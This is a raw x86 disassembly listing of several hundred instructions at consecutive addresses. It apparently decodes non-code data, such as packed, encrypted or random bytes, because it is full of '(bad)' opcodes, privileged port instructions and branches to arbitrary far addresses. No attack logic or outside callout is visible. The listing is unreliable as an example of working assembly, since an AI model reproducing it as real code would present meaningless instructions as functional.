  41ee8f:	cmc    
  41ee90:	xor    bh,dl
  41ee92:	mov    al,0x88
  41ee94:	aad    0xbf
  41ee96:	xchg   esp,eax
  41ee97:	jno    0x41ee35
  41ee99:	leave  
  41ee9a:	lahf   
  41ee9b:	in     eax,0x9a
  41ee9d:	call   0x9876e232
  41eea2:	add    DWORD PTR [esi],esi
  41eea4:	js     0x41ee4e
  41eea6:	mov    ebx,0x5521bc39
  41eeab:	mov    ebx,0x11f9adab
  41eeb0:	fild   QWORD PTR [edi+0x2bd12e4f]
  41eeb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eeb7:	xor    al,0xae
  41eeb9:	or     ecx,esi
  41eebb:	sbb    al,0x72
  41eebd:	push   ss
  41eebe:	jne    0x41eeb8
  41eec0:	(bad)  
  41eec1:	pop    ebx
  41eec2:	repz push ebx
  41eec4:	jns    0x41eefc
  41eec6:	sub    eax,0xe9e9bf8b
  41eecb:	fstp   QWORD PTR [edi]
  41eecd:	adc    BYTE PTR [ebp+0x43],bl
  41eed0:	lods   al,BYTE PTR ds:[esi]
  41eed1:	mov    edi,0x1b274b67
  41eed6:	push   0xffffffda
  41eed8:	xor    eax,0x7b71c35f
  41eedd:	xor    BYTE PTR [edx],bh
  41eedf:	lods   al,BYTE PTR ds:[esi]
  41eee0:	cmp    eax,0xca27ddae
  41eee5:	inc    esp
  41eee6:	mov    dh,0xb3
  41eee8:	xor    al,0x96
  41eeea:	aad    0x7b
  41eeec:	test   DWORD PTR [edi+0x74b7f623],ecx
  41eef2:	int    0xfe
  41eef4:	shl    BYTE PTR [edx-0x54c190f],0x12
  41eefb:	outs   dx,BYTE PTR ds:[esi]
  41eefc:	and    ebp,esp
  41eefe:	jns    0x41eef6
  41ef00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef01:	pop    eax
  41ef02:	adc    eax,0x3ee0308d
  41ef07:	cmc    
  41ef08:	mov    eax,0x841bacb0
  41ef0d:	push   ss
  41ef0e:	cdq    
  41ef0f:	imul   edi,DWORD PTR [esi],0xffffffe1
  41ef12:	lock rol edi,1
  41ef15:	mov    bl,0xf8
  41ef17:	xor    DWORD PTR [ebp-0x18e7410e],edx
  41ef1d:	bound  esi,QWORD PTR [edx]
  41ef1f:	popa   
  41ef20:	cmp    BYTE PTR [ebp+0x5f],al
  41ef23:	test   eax,0x9f627c3e
  41ef28:	into   
  41ef29:	test   eax,0xf1918865
  41ef2e:	sbb    edi,eax
  41ef30:	int3   
  41ef31:	push   eax
  41ef32:	fwait
  41ef33:	imul   ebx,eax,0x39bf4854
  41ef39:	add    eax,0xbd6e9221
  41ef3e:	fist   DWORD PTR [eax]
  41ef40:	ja     0x41ef46
  41ef42:	adc    esi,DWORD PTR ds:0xea1e65a1
  41ef48:	addr16 cmp al,0xe8
  41ef4b:	add    al,0x67
  41ef4d:	pop    esi
  41ef4e:	(bad)  [ecx]
  41ef50:	jp     0x41ef52
  41ef52:	ins    DWORD PTR es:[edi],dx
  41ef53:	mov    dl,0xf4
  41ef55:	xchg   esp,eax
  41ef56:	and    esp,ebp
  41ef58:	mov    al,ds:0x38c6cd3
  41ef5d:	shl    bl,1
  41ef5f:	jne    0x41eef1
  41ef61:	mov    bh,0x89
  41ef63:	cmp    ch,BYTE PTR [edx+0x7e444f38]
  41ef69:	xor    edx,DWORD PTR [ebx+0xc3eaa2]
  41ef6f:	imul   esp,DWORD PTR ds:[ecx+ecx*8],0x3184af5d
  41ef77:	mov    eax,ds:0xa86e682e
  41ef7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef7d:	das    
  41ef7e:	cdq    
  41ef7f:	pop    esi
  41ef80:	xchg   esi,eax
  41ef81:	xlat   BYTE PTR ds:[ebx]
  41ef82:	in     eax,0xff
  41ef84:	mov    ebp,DWORD PTR [edi-0x733f2670]
  41ef8a:	cli    
  41ef8b:	adc    DWORD PTR ds:0x862d01ca,esp
  41ef91:	sub    DWORD PTR [ecx-0x7d],edx
  41ef94:	jecxz  0x41ef65
  41ef96:	mov    ebx,gs
  41ef98:	retf   
  41ef99:	jle    0x41ef9c
  41ef9b:	mov    al,ds:0xe252d0a7
  41efa0:	mov    esi,0xbbf7989
  41efa5:	pop    eax
  41efa6:	mov    al,0xd2
  41efa8:	xchg   ecx,eax
  41efa9:	inc    edi
  41efaa:	jle    0x41ef72
  41efac:	cmp    esp,ecx
  41efae:	sub    al,BYTE PTR [edi]
  41efb0:	mov    ebx,0xc6fdf518
  41efb5:	dec    edi
  41efb6:	xchg   ebx,eax
  41efb7:	push   esi
  41efb8:	call   0x115095e0
  41efbd:	shl    esi,cl
  41efbf:	push   ecx
  41efc0:	pop    ecx
  41efc1:	test   BYTE PTR [edi-0x22a24fc7],0x48
  41efc8:	jae    0x41efa5
  41efca:	fcomp  QWORD PTR [ecx+0x18]
  41efcd:	test   al,0xdd
  41efcf:	push   ebx
  41efd0:	jb     0x41ef8d
  41efd2:	aam    0xaf
  41efd4:	mov    bh,BYTE PTR [eax+0x53269de6]
  41efda:	pop    eax
  41efdb:	cmp    BYTE PTR [ecx+0x27425fa3],0x66
  41efe2:	ds pushf 
  41efe4:	dec    ecx
  41efe5:	push   cs
  41efe6:	mov    ebx,0x3ab946bb
  41efeb:	or     BYTE PTR [edx-0x16],ch
  41efee:	(bad)  
  41efef:	outs   dx,BYTE PTR ds:[esi]
  41eff0:	or     esp,ebx
  41eff2:	daa    
  41eff3:	adc    al,0xfa
  41eff5:	aas    
  41eff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eff7:	push   edi
  41eff8:	pop    eax
  41eff9:	retf   
  41effa:	and    eax,0x5994c1c3
  41efff:	pop    esi
  41f000:	scas   al,BYTE PTR es:[edi]
  41f001:	(bad)  [ebx-0xb]
  41f004:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f005:	fisttp WORD PTR [ecx]
  41f007:	(bad)  
  41f009:	stc    
  41f00a:	inc    esp
  41f00b:	sbb    esp,DWORD PTR [edi-0x3e294e27]
  41f011:	icebp  
  41f012:	lds    edx,FWORD PTR [edi+0x4b5447ba]
  41f018:	dec    ebx
  41f019:	sbb    BYTE PTR [esi+0x76],ah
  41f01c:	mov    bh,0xf
  41f01e:	lds    eax,FWORD PTR [ecx+0x34517174]
  41f024:	inc    esp
  41f025:	lea    esp,[esi-0x5eea2f72]
  41f02b:	inc    esi
  41f02c:	jno    0x41f08c
  41f02e:	push   ds
  41f02f:	clc    
  41f030:	jnp    0x41efbd
  41f032:	rcr    BYTE PTR [ebx+0x6190b2d6],1
  41f038:	rol    DWORD PTR [ebx+0x10],1
  41f03b:	rcr    bl,cl
  41f03d:	mov    edi,0xa7af2cf0
  41f042:	push   edi
  41f043:	and    eax,0xe425050
  41f048:	out    0xb7,eax
  41f04a:	and    al,BYTE PTR [edi+0x4a]
  41f04d:	dec    esp
  41f04e:	sub    eax,ecx
  41f050:	fnsave [edx+0x6a920edb]
  41f056:	ja     0x41eff9
  41f058:	imul   esi,esp,0xf
  41f05b:	jns    0x41f090
  41f05d:	mov    ch,0xf6
  41f05f:	sahf   
  41f060:	jge    0x41f042
  41f062:	sub    eax,DWORD PTR [ecx+0x7836c16f]
  41f068:	xor    DWORD PTR [edi-0x18a4c452],ebp
  41f06e:	in     eax,dx
  41f06f:	les    ebx,FWORD PTR [ecx-0x24e83a1a]
  41f075:	xchg   ebp,eax
  41f076:	push   es
  41f077:	fs (bad) 
  41f079:	sti    
  41f07a:	pop    ebx
  41f07b:	sti    
  41f07c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f07d:	and    bh,bl
  41f07f:	sub    esp,eax
  41f081:	push   ds
  41f082:	dec    ecx
  41f083:	xchg   edi,eax
  41f084:	push   ss
  41f085:	inc    edx
  41f086:	xor    BYTE PTR [esp+ebp*2-0x34],0xa9
  41f08b:	fcomp  DWORD PTR [edx+0x70]
  41f08e:	push   ebp
  41f08f:	call   0x808c:0x9f9208b8
  41f096:	stc    
  41f097:	cmp    DWORD PTR [eax+esi*4],esi
  41f09a:	jo     0x41f076
  41f09c:	pop    edx
  41f09d:	add    al,0xc1
  41f09f:	outs   dx,BYTE PTR ds:[esi]
  41f0a0:	pushf  
  41f0a1:	jmp    0x7256:0x9c75f943
  41f0a8:	push   0xd4290f2a
  41f0ad:	dec    ebx
  41f0ae:	sub    esi,DWORD PTR [edx+0x1e]
  41f0b1:	xor    BYTE PTR [esi-0x6e3f8acd],dh
  41f0b7:	pop    ebp
  41f0b8:	cwde   
  41f0b9:	stos   BYTE PTR es:[edi],al
  41f0ba:	push   ebx
  41f0bb:	loopne 0x41f0db
  41f0bd:	sub    BYTE PTR [ebx],0xb4
  41f0c0:	sub    BYTE PTR [edi-0x66],dl
  41f0c3:	xchg   BYTE PTR [esi+ebp*4],ah
  41f0c6:	jne    0x41f12a
  41f0c8:	ins    BYTE PTR es:[edi],dx
  41f0c9:	cmp    edx,DWORD PTR [edi]
  41f0cb:	loope  0x41f144
  41f0cd:	inc    ebp
  41f0ce:	int3   
  41f0cf:	xchg   ebp,eax
  41f0d0:	mov    edi,DWORD PTR [eax]
  41f0d2:	mov    bh,0x51
  41f0d4:	sub    al,0x96
  41f0d6:	out    dx,al
  41f0d7:	fild   WORD PTR [esi-0x4c]
  41f0da:	sub    eax,0x6c0d0616
  41f0df:	push   es
  41f0e0:	mov    ebp,ebx
  41f0e2:	inc    ebx
  41f0e3:	mov    dl,0x1d
  41f0e5:	and    dl,bh
  41f0e7:	adc    esi,DWORD PTR [ebp-0x74]
  41f0ea:	ficomp DWORD PTR [ebx+ebp*8-0x56]
  41f0ee:	sub    dl,ch
  41f0f0:	repnz enter 0xb191,0xa7
  41f0f5:	xchg   esp,eax
  41f0f6:	je     0x41f120
  41f0f8:	fsubr  DWORD PTR [esi+0x5f906a6e]
  41f0fe:	add    esp,DWORD PTR [edx]
  41f100:	xor    al,0x47
  41f102:	gs out 0xb9,al
  41f105:	int    0x41
  41f107:	cmc    
  41f108:	addr16 jb 0x41f0e6
  41f10b:	xor    edi,0xffffffc5
  41f10e:	out    0x19,eax
  41f110:	outs   dx,BYTE PTR ds:[esi]
  41f111:	cmp    eax,0x458c7f5
  41f116:	add    eax,DWORD PTR [eax+edx*1]
  41f119:	and    bl,BYTE PTR [esi-0x21]
  41f11c:	je     0x41f155
  41f11e:	lahf   
  41f11f:	xor    al,0x8
  41f121:	ds test eax,0xa47933ee
  41f127:	fisubr DWORD PTR [edx]
  41f129:	sbb    bl,BYTE PTR [edi-0x19]
  41f12c:	cmc    
  41f12d:	clc    
  41f12e:	xchg   BYTE PTR [edi+0x8],al
  41f131:	add    BYTE PTR es:[edx-0x40edf626],al
  41f138:	ficomp WORD PTR [edi-0x5f265ced]
  41f13e:	cli    
  41f13f:	into   
  41f140:	mov    eax,0xfc7991ff
  41f145:	cld    
  41f146:	(bad)  
  41f148:	xchg   bx,ax
  41f14a:	sbb    eax,DWORD PTR fs:[ecx+esi*4-0x151b9d0b]
  41f152:	lock (bad) 
  41f154:	(bad)  
  41f156:	mov    al,ds:0x3fe45ed2
  41f15b:	inc    edi
  41f15c:	shr    BYTE PTR [esp+eax*2+0x4c63796b],cl
  41f163:	stos   BYTE PTR es:[edi],al
  41f164:	jns    0x41f106
  41f166:	sbb    ecx,DWORD PTR [edx]
  41f168:	cwde   
  41f169:	repz mov ch,0x22
  41f16c:	xlat   BYTE PTR ds:[ebx]
  41f16d:	mov    gs,ebp
  41f16f:	add    al,0xab
  41f171:	mov    es,WORD PTR [ebp-0x16]
  41f174:	xor    ah,BYTE PTR [esi+0x27]
  41f177:	arpl   ax,cx
  41f179:	mul    BYTE PTR [esi-0x7a]
  41f17c:	ins    BYTE PTR es:[edi],dx
  41f17d:	jno    0x41f17f
  41f17f:	mov    bl,0xb4
  41f181:	outs   dx,DWORD PTR ds:[esi]
  41f182:	xchg   DWORD PTR [edx-0x267c00bc],ebx
  41f188:	out    0xe3,al
  41f18a:	push   edx
  41f18b:	add    bl,cl
  41f18d:	push   ecx
  41f18e:	dec    eax
  41f18f:	inc    edx
  41f190:	je     0x41f1f9
  41f192:	inc    ebx
  41f193:	mov    eax,0x4aabf2d3
  41f198:	add    BYTE PTR [edi-0x73],0x64
  41f19c:	and    ebp,DWORD PTR [edx-0x20e3ff18]
  41f1a2:	test   BYTE PTR [edx-0x1ee59746],ah
  41f1a8:	mov    cl,0x83
  41f1aa:	push   ecx
  41f1ab:	jg     0x41f187
  41f1ad:	jae    0x41f1b6
  41f1af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1b0:	jge    0x41f1ab
  41f1b2:	fcom   st(0)
  41f1b4:	icebp  
  41f1b5:	xchg   edi,eax
  41f1b6:	sub    DWORD PTR ss:[edi-0x3a],edx
  41f1ba:	push   ds
  41f1bb:	je     0x41f20f
  41f1bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1be:	or     ah,dh
  41f1c0:	arpl   WORD PTR [edi+0x35df9fe0],cx
  41f1c6:	ficomp WORD PTR [edi+edx*8+0x76]
  41f1ca:	je     0x41f165
  41f1cc:	push   ecx
  41f1cd:	retf   0xda4
  41f1d0:	ds jp  0x41f16d
  41f1d3:	push   es
  41f1d4:	mov    edi,0xa30cd810
  41f1d9:	inc    DWORD PTR [esp+ebx*8-0x77]
  41f1dd:	std    
  41f1de:	pop    edi
  41f1df:	les    ebp,FWORD PTR [edi]
  41f1e1:	or     eax,0x9414fdfc
  41f1e6:	add    al,0x61
  41f1e8:	mov    DWORD PTR [ebx],esi
  41f1ea:	push   ecx
  41f1eb:	dec    edi
  41f1ec:	mov    dl,0xda
  41f1ee:	jbe    0x41f1e9
  41f1f0:	add    DWORD PTR [edx+edi*4],0xffffffc8
  41f1f4:	inc    edx
  41f1f5:	jbe    0x41f243
  41f1f7:	out    dx,al
  41f1f8:	nop
  41f1f9:	jmp    0x41f275
  41f1fb:	xor    ebx,DWORD PTR [edi-0x275aed93]
  41f201:	mov    ch,0xfc
  41f203:	aaa    
  41f204:	sub    DWORD PTR [ebx+0x3ee35604],ebp
  41f20a:	fcom   DWORD PTR [eax+0x4464c5da]
  41f210:	out    0xd2,al
  41f212:	push   DWORD PTR [ebp-0x7e]
  41f215:	jmp    0x5cef2c48
  41f21a:	sub    bl,ah
  41f21c:	fcmovnb st,st(0)
  41f21e:	sbb    BYTE PTR [esi],0x85
  41f221:	rcr    BYTE PTR [edx+eiz*4],0xe
  41f225:	xchg   edx,eax
  41f226:	pushf  
  41f227:	mov    ebx,0x323d4b5e
  41f22c:	xor    BYTE PTR [ebp-0x426d1ef1],al
  41f232:	mov    esi,0xe762a134
  41f237:	out    dx,eax
  41f238:	dec    esi
  41f239:	sar    BYTE PTR [ebp-0x7d0a481c],cl
  41f23f:	lods   eax,DWORD PTR ds:[esi]
  41f240:	or     BYTE PTR [edi],bl
  41f242:	jmp    edi
  41f244:	call   0x8ead:0xc8026cae
  41f24b:	jge    0x41f258
  41f24d:	mov    bh,BYTE PTR [edx]
  41f24f:	mov    al,0x31
  41f251:	sbb    al,0x26
  41f253:	ins    DWORD PTR es:[edi],dx
  41f254:	mov    cl,0xc5
  41f256:	mov    ecx,0x49f6733d
  41f25b:	inc    ecx
  41f25c:	into   
  41f25d:	push   edx
  41f25e:	aas    
  41f25f:	xor    ah,BYTE PTR [edi-0xe]
  41f262:	aaa    
  41f263:	pop    edi
  41f264:	ja     0x41f2a9
  41f266:	repz pop es
  41f268:	dec    edx
  41f269:	xchg   ecx,eax
  41f26a:	xchg   edx,eax
  41f26b:	cmp    DWORD PTR [eax+0x33],esi
  41f26e:	inc    ebx
  41f26f:	clc    
  41f270:	js     0x41f2a0
  41f272:	fiadd  DWORD PTR [ebp-0x21]
  41f275:	outs   dx,DWORD PTR ds:[esi]
  41f276:	sti    
  41f277:	cs xchg ecx,eax
  41f279:	fstp   QWORD PTR [edi+0x57079b7d]
  41f27f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f280:	mov    edi,0x851b786
  41f285:	xor    eax,ebp
  41f287:	add    DWORD PTR [edx+0x22],ecx
  41f28a:	mov    BYTE PTR [edi],dh
  41f28c:	(bad)  
  41f28d:	xchg   edi,eax
  41f28e:	xchg   edx,eax
  41f28f:	ja     0x41f27f
  41f291:	mov    edi,0xfee6822b
  41f296:	cld    
  41f297:	mov    bl,0x4f
  41f299:	loopne 0x41f304
  41f29b:	cmp    eax,0xcb632398
  41f2a0:	adc    al,0x8e
  41f2a2:	pop    ss
  41f2a3:	pcmpeqd mm5,mm1
  41f2a6:	icebp  
  41f2a7:	xor    dl,BYTE PTR [ebx+eiz*1-0x5bca655c]
  41f2ae:	cmp    DWORD PTR ds:0xba4b7e29,eax
  41f2b4:	cs aaa 
  41f2b6:	and    bl,dl
  41f2b8:	xchg   edx,eax
  41f2b9:	ret    0xb387
  41f2bc:	jbe    0xd067049a
  41f2c2:	jb     0x41f29a
  41f2c4:	imul   edx,esp,0xfffffff9
  41f2c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2c8:	inc    eax
  41f2c9:	loop   0x41f256
  41f2cb:	fmul   st(4),st
  41f2cd:	icebp  
  41f2ce:	je     0x41f2ea
  41f2d0:	retf   
  41f2d1:	cli    
  41f2d2:	pop    es
  41f2d3:	xlat   BYTE PTR ds:[ebx]
  41f2d4:	push   0xffffffc1
  41f2d6:	adc    DWORD PTR [esi-0x4f55dc57],edx
  41f2dc:	das    
  41f2dd:	rdmsr  
  41f2df:	mov    edi,0xac816da6
  41f2e4:	ss jp  0x41f29b
  41f2e7:	push   es
  41f2e8:	sti    
  41f2e9:	bound  ebx,QWORD PTR [eax]
  41f2eb:	push   esi
  41f2ec:	jns    0x41f358
  41f2ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2ef:	gs jno 0x41f2ad
  41f2f2:	scas   al,BYTE PTR es:[edi]
  41f2f3:	mov    esp,0xcdfd2c76
  41f2f8:	retf   0x9fd5
  41f2fb:	mov    al,0x4d
  41f2fd:	dec    edi
  41f2fe:	ja     0x41f2dc
  41f300:	into   
  41f301:	dec    ebp
  41f302:	add    bh,BYTE PTR [ecx]
  41f304:	push   eax
  41f305:	sbb    eax,DWORD PTR [esp+edx*4]
  41f308:	cmc    
  41f309:	(bad)  
  41f30a:	sbb    eax,0xe67f1560
  41f30f:	sbb    BYTE PTR [edi],bl
  41f311:	xor    eax,0x960cb783
  41f316:	fidiv  WORD PTR [edi+0x5a8d2b45]
  41f31c:	adc    BYTE PTR [eax-0x76],al
  41f31f:	dec    esp
  41f320:	dec    edi
  41f321:	fs int 0x5
  41f324:	jge    0x41f342
  41f326:	xlat   BYTE PTR ds:[ebx]
  41f327:	lock fbstp TBYTE PTR [eax+0x471ec00c]
  41f32e:	jbe    0x41f31e
  41f330:	rcl    DWORD PTR [eax+0x33042a46],0xd4
  41f337:	jb     0x41f2ce
  41f339:	ja     0x41f312
  41f33b:	stos   DWORD PTR es:[edi],eax
  41f33c:	xor    ch,BYTE PTR [eax+0x25]
  41f33f:	push   ss
  41f340:	add    BYTE PTR [eax+0x16],al
  41f343:	xchg   BYTE PTR [edi],dl
  41f345:	ja     0x41f2de
  41f347:	or     ecx,DWORD PTR [eax-0x72]
  41f34a:	aaa    
  41f34b:	mov    dh,0x8c
  41f34d:	sbb    al,dl
  41f34f:	xlat   BYTE PTR ds:[ebx]
  41f350:	xor    al,0xb
  41f352:	daa    
  41f353:	sub    al,0xc8
  41f355:	push   edi
  41f356:	dec    ebx
  41f357:	(bad)  
  41f358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f359:	cmc    
  41f35a:	xchg   ebp,eax
  41f35b:	xchg   ebx,eax
  41f35c:	popa   
  41f35d:	or     eax,0x193fafe5
  41f362:	xchg   edx,eax
  41f363:	test   eax,0xa9b22f8f
  41f368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f369:	not    BYTE PTR [ebx-0x58]
  41f36c:	xor    dh,BYTE PTR [esi-0x23]
  41f36f:	cld    
  41f370:	cmp    al,al
  41f372:	stc    
  41f373:	inc    ecx
  41f374:	jne    0x41f3bd
  41f376:	sub    al,BYTE PTR [esi+edx*8]
  41f379:	jmp    0x41f37d
  41f37b:	xchg   esi,eax
  41f37c:	push   edi
  41f37d:	fcom   QWORD PTR [eax]
  41f37f:	sub    eax,0x44358d17
  41f384:	pop    edi
  41f385:	mov    dl,ch
  41f387:	(bad)  
  41f388:	mov    ebp,0x132f7bc4
  41f38d:	ret    
  41f38e:	sti    
  41f38f:	sbb    al,0x3b
  41f391:	cld    
  41f392:	sbb    edi,edx
  41f394:	push   ebp
  41f395:	xchg   ebp,eax
  41f396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f397:	sbb    BYTE PTR [edx],0xa0
  41f39a:	imul   esi,DWORD PTR [esi-0x2a75ccdc],0x6003b1ee
  41f3a4:	repnz aad 0x42
  41f3a7:	fisttp WORD PTR [edi-0x2]
  41f3aa:	rcl    BYTE PTR [ebx],cl
  41f3ac:	or     eax,DWORD PTR [edi-0x1a]
  41f3af:	mov    ds:0xb6f5f682,eax
  41f3b4:	call   0x73c1:0x77dd5fb2
  41f3bb:	(bad)  
  41f3bc:	sbb    BYTE PTR [eax],dh
  41f3be:	hlt    
  41f3bf:	in     al,dx
  41f3c0:	xor    BYTE PTR [eax+0x4ab5003a],cl
  41f3c6:	imul   eax,ebx,0x22a51053
  41f3cc:	or     ch,BYTE PTR [eax]
  41f3ce:	dec    ebp
  41f3cf:	dec    esi
  41f3d0:	aad    0x41
  41f3d2:	stos   DWORD PTR es:[edi],eax
  41f3d3:	push   ss
  41f3d4:	jmp    0x75c166da
  41f3d9:	jb     0x41f43f
  41f3db:	dec    esp
  41f3dc:	mov    cl,0x41
  41f3de:	mov    eax,ds:0x7c874859
  41f3e3:	retf   0xe60c
  41f3e6:	stos   BYTE PTR es:[edi],al
  41f3e7:	sar    DWORD PTR [eax-0x75],0x9c
  41f3eb:	or     bl,BYTE PTR [edi-0x12]
  41f3ee:	pop    esi
  41f3ef:	adc    ecx,DWORD PTR fs:[esi-0x54e32bde]
  41f3f6:	inc    dx
  41f3f8:	rcr    DWORD PTR [edi+0x61],cl
  41f3fb:	jmp    0xb6bd626f
  41f400:	in     eax,dx
  41f401:	stc    
  41f402:	adc    DWORD PTR [eax-0x31],ebx
  41f405:	inc    edi
  41f406:	jge    0x41f45f
  41f408:	and    cl,BYTE PTR [ebx+0xa5b18ab]
  41f40e:	sub    dh,BYTE PTR [eax-0x4c5291d6]
  41f414:	or     ah,BYTE PTR [ecx+ebx*4]
  41f417:	popa   
  41f418:	icebp  
  41f419:	(bad)  
  41f41a:	sub    eax,0x5db7197a
  41f41f:	out    dx,al
  41f420:	pop    esp
  41f421:	lea    edx,[ebp+ebx*4+0x29]
  41f425:	test   BYTE PTR [edi+0x7b],ch
  41f428:	(bad)  
  41f429:	hlt    
  41f42a:	jmp    0xd06e:0x92d1077c
  41f431:	out    dx,al
  41f432:	popa   
  41f433:	and    ebx,DWORD PTR [esi-0x1e0e2c36]
  41f439:	mov    ds:0x91ec9d2d,eax
  41f43e:	or     ah,bl
  41f440:	std    
  41f441:	pop    ds
  41f442:	and    BYTE PTR [ecx],dh
  41f444:	add    edx,ecx
  41f446:	sahf   
  41f447:	repz test ah,dl
  41f44a:	imul   edi,eax,0xf1de1eed
  41f450:	mov    gs,WORD PTR [ebp+0x32]
  41f453:	ficomp DWORD PTR [edi-0x7c6a0640]
  41f459:	and    eax,0xca7816a2
  41f45e:	or     ecx,edi
  41f460:	sbb    al,0x40
  41f462:	repnz aas 
  41f464:	(bad)
  41f468:	dec    edx
  41f469:	jmp    0x41f487
  41f46b:	push   eax
  41f46c:	mov    esi,0xbcc655bb
  41f471:	retf   0xe2d1
  41f474:	jl     0x41f438
  41f476:	imul   esp,eax,0x28
  41f479:	push   esp
  41f47a:	fidivr DWORD PTR [esi+0x5f]
  41f47d:	aaa    
  41f47e:	xor    DWORD PTR [ebx+edi*1],ecx
  41f481:	lea    edi,[edx+ebx*8-0x49d09a73]
  41f488:	jp     0x41f491
  41f48a:	out    dx,eax
  41f48b:	jns    0x41f4f0
  41f48d:	add    DWORD PTR [ecx],eax
  41f48f:	cld    
  41f490:	fisubr WORD PTR [ebx-0x49]
  41f493:	fild   DWORD PTR [edx+0x4d]
  41f496:	jnp    0x41f46e
  41f498:	jbe    0x41f462
  41f49a:	mov    esp,0xcca2a80
  41f49f:	sub    esi,DWORD PTR [edx-0x6a]
  41f4a2:	push   0x30f32326
  41f4a7:	jnp    0x41f4ad
  41f4a9:	pop    ecx
  41f4aa:	ja     0x41f468
  41f4ac:	je     0x41f4fc
  41f4ae:	in     eax,0x5a
  41f4b0:	push   ss
  41f4b1:	mov    cl,0xd0
  41f4b3:	je     0x41f4bd
  41f4b5:	xchg   ebp,eax
  41f4b6:	arpl   WORD PTR [esi],bx
  41f4b8:	mov    bl,0x40
  41f4ba:	push   ds
  41f4bb:	lahf   
  41f4bc:	pop    es
  41f4bd:	gs inc edi
  41f4bf:	jmp    0x41f4c8
  41f4c1:	test   al,0x31
  41f4c3:	pop    edi
  41f4c4:	and    al,0x67
  41f4c6:	call   0xa1e0ce4f
  41f4cb:	and    eax,0xa3eafce0
  41f4d0:	jp     0x41f470
  41f4d2:	fistp  QWORD PTR [esi+eiz*8+0x7fc2504f]
  41f4d9:	es push edx
  41f4db:	add    esi,ebx
  41f4dd:	inc    eax
  41f4de:	nop
  41f4df:	jle    0x41f4f1
  41f4e1:	dec    ebx
  41f4e2:	xchg   ebx,eax
  41f4e3:	push   esp
  41f4e4:	pop    es
  41f4e5:	lods   eax,DWORD PTR ds:[esi]
  41f4e6:	sbb    edi,DWORD PTR [ecx+0x3fd3df90]
  41f4ec:	mov    ds:0x22632037,eax
  41f4f1:	mov    bl,0xe4
  41f4f3:	adc    BYTE PTR [esi],ah
  41f4f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4f6:	add    BYTE PTR [eax+0x97226f9],0x83
  41f4fd:	inc    ebx
  41f4fe:	inc    edi
  41f4ff:	adc    eax,0xb9b31de2
  41f504:	inc    eax
  41f505:	jge    0x41f581
  41f507:	cld    
  41f508:	mov    ds:0x33656b18,al
  41f50d:	and    ch,BYTE PTR [ebp-0x62]
  41f510:	push   0xfffffff2
  41f512:	push   ss
  41f513:	out    0x51,eax
  41f515:	bnd jns 0x41f519
  41f518:	fcom   QWORD PTR [ecx+0x7a]
  41f51b:	or     eax,0xb01d0ad5
  41f520:	out    dx,eax
  41f521:	xchg   si,ax
  41f523:	jo     0x41f5a0
  41f525:	dec    edx
  41f526:	out    0x8,al
  41f528:	dec    ecx
  41f529:	cmp    BYTE PTR [eax+esi*4+0x72f80bea],ch
  41f530:	lods   eax,DWORD PTR ds:[esi]
  41f531:	jle    0x41f500
  41f533:	out    dx,eax
  41f534:	and    esi,ebx
  41f536:	ds std 
  41f538:	sahf   
  41f539:	lods   eax,DWORD PTR ds:[esi]
  41f53a:	jno    0x41f557
  41f53c:	fcmovb st,st(4)
  41f53e:	scas   al,BYTE PTR es:[edi]
  41f53f:	xlat   BYTE PTR ds:[ebx]
  41f540:	push   0x12
  41f542:	mov    bh,0x96
  41f544:	sub    eax,0x3215c98a
  41f549:	push   cs
  41f54a:	mov    dl,0x10
  41f54c:	shl    DWORD PTR [ecx+eax*4+0x3a7fdaba],0x63
  41f554:	pop    ds
  41f555:	loopne 0x41f4e8
  41f557:	mov    DWORD PTR [esi+0x12],ebx
  41f55a:	xchg   esp,eax
  41f55b:	sbb    DWORD PTR [edx],ebx
  41f55d:	mov    ?,WORD PTR [ebp+0x37fa5018]
  41f563:	dec    esi
  41f564:	cld    
  41f565:	lahf   
  41f566:	sbb    dl,BYTE PTR [esi-0x7a8e84ab]
  41f56c:	xchg   ebx,eax
  41f56d:	mov    bl,0xb6
  41f56f:	pushf  
  41f570:	pop    ss
  41f571:	enter  0xa7d8,0x78
  41f575:	stos   DWORD PTR es:[edi],eax
  41f576:	js     0x41f56a
  41f578:	ja     0x41f5a3
  41f57a:	(bad)  
  41f57b:	icebp  
  41f57c:	stos   BYTE PTR es:[edi],al
  41f57d:	nop
  41f57e:	loop   0x41f5ec
  41f580:	stc    
  41f581:	gs or  al,0xeb
  41f584:	neg    BYTE PTR [ebx-0x63021197]
  41f58a:	aam    0x31
  41f58c:	jle    0x41f51b
  41f58e:	jnp    0x41f547
  41f590:	push   ecx
  41f591:	es pusha 
  41f593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f594:	int3   
  41f595:	dec    esp
  41f596:	mov    DWORD PTR [ebx],ecx
  41f598:	add    esi,DWORD PTR [ebx+0x28e17870]
  41f59e:	not    eax
  41f5a0:	adc    DWORD PTR [ecx+ebx*1+0x2e],ebp
  41f5a4:	into   
  41f5a5:	xchg   edi,eax
  41f5a6:	movd   mm7,DWORD PTR [ebx]
  41f5a9:	mov    ah,0x70
  41f5ab:	in     eax,dx
  41f5ac:	retf   
  41f5ad:	js     0x41f588
  41f5af:	out    dx,al
  41f5b0:	lods   eax,DWORD PTR ds:[esi]
  41f5b1:	inc    edi
  41f5b2:	loopne 0x41f54b
  41f5b4:	mov    ah,0x8e
  41f5b6:	mov    ah,0xd1
  41f5b8:	inc    ebp
  41f5b9:	rol    DWORD PTR [edx+0x66],cl
  41f5bc:	mov    WORD PTR [esi],ds
  41f5be:	imul   esi,DWORD PTR [edx+0x20],0x9693c373
  41f5c5:	sbb    eax,0x68ece3d1
